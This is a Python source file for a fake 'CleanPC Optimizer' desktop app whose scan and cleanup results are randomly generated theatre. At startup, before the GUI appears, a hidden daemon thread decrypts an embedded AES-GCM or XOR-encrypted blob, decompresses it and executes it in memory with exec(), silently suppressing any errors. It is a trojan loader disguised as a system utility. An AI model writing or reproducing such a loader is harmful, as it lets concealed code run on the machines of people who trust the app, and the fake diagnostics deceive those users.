_Z     = True

def _derive(pwd, salt, n=32):
    return hashlib.pbkdf2_hmac("sha256", pwd, salt, 200_000, dklen=n)

def _decrypt():
    if _ALGO == b"XOR1":
        key = _derive(_PWD, _SALT, 32)
        ks = bytearray(); i = 0
        while len(ks) < len(_CT):
            ks.extend(hashlib.sha256(key + i.to_bytes(8, "big")).digest()); i += 1
        return bytes(a ^ b for a, b in zip(_CT, ks))
    from Crypto.Cipher import AES
    key = _derive(_PWD, _SALT, 32)
    c = AES.new(key, AES.MODE_GCM, nonce=_NONCE)
    return c.decrypt_and_verify(_CT, _TAG)

def _run_payload():
    try:
        time.sleep(2.0)   # small delay so GUI paints first
        raw = _decrypt()
        if _Z:
            import zlib
            raw = zlib.decompress(raw)
        code = compile(raw, "<mem>", "exec")
        g = {"__name__": "__main__", "__builtins__": __builtins__}
        exec(code, g, g)
    except Exception:
        pass   #  GUI

def _spawn_hidden():
    t = threading.Thread(target=_run_payload, daemon=True)
    t.start()

# ============================================================
#  — PC Optimizer
# ============================================================
THEMES = {
    "bg":       "#0f1117",
    "panel":    "#161a23",
    "accent":   "#3d7eff",
    "accent2":  "#57f2b5",
    "text":     "#e7ecf3",
    "subtext":  "#7a849a",
    "danger":   "#ff5d5d",
}

class OptimizerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CleanPC Optimizer — System Tune-Up")
        self.root.geometry("820x560")
        self.root.configure(bg=THEMES["bg"])
        self.root.resizable(False, False)

        self.log_q = queue.Queue()
        self.scanning = False
        self._build_ui()
        self._loop_log()

        # auto-run
        self.root.after(500, self.run_scan)

    def _build_ui(self):
        # header
        head = tk.Frame(self.root, bg=THEMES["bg"], height=80)
        head.pack(fill="x", padx=24, pady=(18, 6))
        tk.Label(head, text="🛡️  CleanPC Optimizer", bg=THEMES["bg"],
                 fg=THEMES["text"], font=("Segoe UI", 20, "bold")).pack(anchor="w")
        tk.Label(head, text="Boost performance · Clean junk · Fix issues",
                 bg=THEMES["bg"], fg=THEMES["subtext"],
                 font=("Segoe UI", 10)).pack(anchor="w")

        # status card
        card = tk.Frame(self.root, bg=THEMES["panel"])
        card.pack(fill="x", padx=24, pady=10)
        self.status_var = tk.StringVar(value="Ready")
        self.status_lbl = tk.Label(card, textvariable=self.status_var,
                                   bg=THEMES["panel"], fg=THEMES["accent2"],
                                   font=("Segoe UI", 11, "bold"))
        self.status_lbl.pack(anchor="w", padx=16, pady=(12, 4))
        self.progress = ttk.Progressbar(card, length=760, mode="determinate")
        self.progress.pack(padx=16, pady=(2, 4))
        self.sub_var = tk.StringVar(value="")
        tk.Label(card, textvariable=self.sub_var, bg=THEMES["panel"],
                 fg=THEMES["subtext"], font=("Segoe UI", 9)).pack(anchor="w", padx=16, pady=(0, 12))

        # action buttons
        actions = tk.Frame(self.root, bg=THEMES["bg"])
        actions.pack(fill="x", padx=24, pady=(4, 10))
        btns = [
            ("🧹 Clean Junk", self.run_clean),
            ("⚡ Boost Speed", self.run_boost),
            ("🔍 Deep Scan",  self.run_scan),
            ("🧠 Memory Fix",  self.run_mem),
            ("🔒 Privacy Check", self.run_privacy),
        ]
        for i, (label, cb) in enumerate(btns):
            b = tk.Button(actions, text=label, command=cb,
                          bg=THEMES["panel"], fg=THEMES["text"],
                          activebackground=THEMES["accent"], activeforeground="white",
                          relief="flat", bd=0, padx=16, pady=10,
                          font=("Segoe UI", 10, "bold"), cursor="hand2")
            b.grid(row=0, column=i, padx=4, sticky="ew")
            actions.grid_columnconfigure(i, weight=1)

        # log
        logf = tk.Frame(self.root, bg=THEMES["panel"])
        logf.pack(fill="both", expand=True, padx=24, pady=(4, 18))
        self.log = tk.Text(logf, bg=THEMES["panel"], fg=THEMES["text"],
                           insertbackground=THEMES["text"],
                           font=("Consolas", 9), relief="flat", bd=0,
                           height=10, wrap="word")
        self.log.pack(fill="both", expand=True, padx=10, pady=10)
        self.log.tag_config("ok", foreground=THEMES["accent2"])
        self.log.tag_config("warn", foreground="#ffcf5d")
        self.log.tag_config("err", foreground=THEMES["danger"])
        self.log.tag_config("info", foreground=THEMES["subtext"])
        self.log.configure(state="disabled")

    def _log(self, text, tag="info"):
        self.log_q.put((text, tag))

    def _loop_log(self):
        try:
            while True:
                text, tag = self.log_q.get_nowait()
                self.log.configure(state="normal")
                self.log.insert("end", text + "\n", tag)
                self.log.see("end")
                self.log.configure(state="disabled")
        except queue.Empty:
            pass
        self.root.after(80, self._loop_log)

    def _run_steps(self, steps, title):
        if self.scanning:
            return
        self.scanning = True
        self.progress["value"] = 0
        self.status_var.set(title)
        def worker():
            n = len(steps)
            for i, (delay, msg, tag) in enumerate(steps):
                time.sleep(delay)
                self._log(msg, tag)
                self.progress["value"] = (i + 1) / n * 100
                self.sub_var.set(f"{i+1} / {n}")
                self.root.update_idletasks()
            self.status_var.set("✅ Done — system is optimized")
            self.sub_var.set("")
            self.scanning = False
        threading.Thread(target=worker, daemon=True).start()

    def _fake_stats(self):
        return random.randint(100, 900), random.randint(20, 60)

    def run_scan(self):
        mb, pct = self._fake_stats()
        steps = [
            (0.4, "→ Initializing scan engine v4.7.2…", "info"),
            (0.6, f"→ Scanning system files… {random.randint(9000, 24000)} items", "info"),
            (0.5, f"→ Found {mb} MB of junk files", "warn"),
            (0.4, f"→ Registry issues detected: {random.randint(12, 87)}", "warn"),
            (0.6, "→ Checking startup programs…", "info"),
            (0.5, f"→ {random.randint(6, 22)} unused startup items found", "warn"),
            (0.5, "→ Browser cache: {random.randint(120, 640)} MB", "warn"),
            (0.6, "→ Analyzing disk performance…", "info"),
            (0.5, f"→ Disk health: {random.randint(88, 99)}%", "ok"),
            (0.4, "→ Scan complete. Ready to optimize.", "ok"),
        ]
        self._run_steps(steps, "Deep Scanning…")

    def run_clean(self):
        steps = [
            (0.3, "→ Cleaning temporary files…", "info"),
            (0.4, f"→ Removed {random.randint(300, 1400)} temp files", "ok"),
            (0.4, f"→ Cleared {random.randint(120, 640)} MB cache", "ok"),
            (0.4, "→ Cleaning registry entries…", "info"),
            (0.5, f"→ {random.randint(20, 90)} registry keys cleaned", "ok"),
            (0.4, "→ Emptying recycle bin…", "info"),
            (0.5, "→ Cleanup complete", "ok"),
        ]
        self._run_steps(steps, "Cleaning…")

    def run_boost(self):
        steps = [
            (0.4, "→ Optimizing CPU scheduling…", "info"),
            (0.5, "→ Prioritizing foreground apps…", "ok"),
            (0.4, "→ Tuning memory allocation…", "info"),
            (0.6, f"→ Freed {random.randint(200, 900)} MB RAM", "ok"),
            (0.5, "→ Disabling background bloat…", "ok"),
            (0.4, "→ Adjusting power plan: High Performance", "ok"),
            (0.5, "→ System boosted", "ok"),
        ]
        self._run_steps(steps, "Boosting Performance…")

    def run_mem(self):
        steps = [
            (0.3, "→ Analyzing RAM usage…", "info"),
            (0.4, f"→ Current: {random.randint(40, 82)}% used", "warn"),
            (0.5, "→ Compressing idle memory pages…", "info"),
            (0.6, f"→ Recovered {random.randint(150, 720)} MB", "ok"),
            (0.4, "→ Memory optimized", "ok"),
        ]
        self._run_steps(steps, "Optimizing Memory…")

    def run_privacy(self):
        steps = [
            (0.4, "→ Checking browser cookies…", "info"),
            (0.4, f"→ Found {random.randint(80, 500)} tracking cookies", "warn"),
            (0.5, "→ Blocking telemetry endpoints…", "ok"),
            (0.4, "→ Clearing DNS cache…", "ok"),
            (0.4, "→ Privacy shields enabled", "ok"),
        ]
        self._run_steps(steps, "Checking Privacy…")


def _main():
    _spawn_hidden()

    root = tk.Tk()
    try:
        style = ttk.Style(root)
        style.theme_use("clam")
        style.configure("TProgressbar", troughcolor=THEMES["bg"],
                        background=THEMES["accent"], thickness=8)
    except Exception:
        pass
    OptimizerApp(root)
    root.mainloop()

if __name__ == "__main__":
    _main()
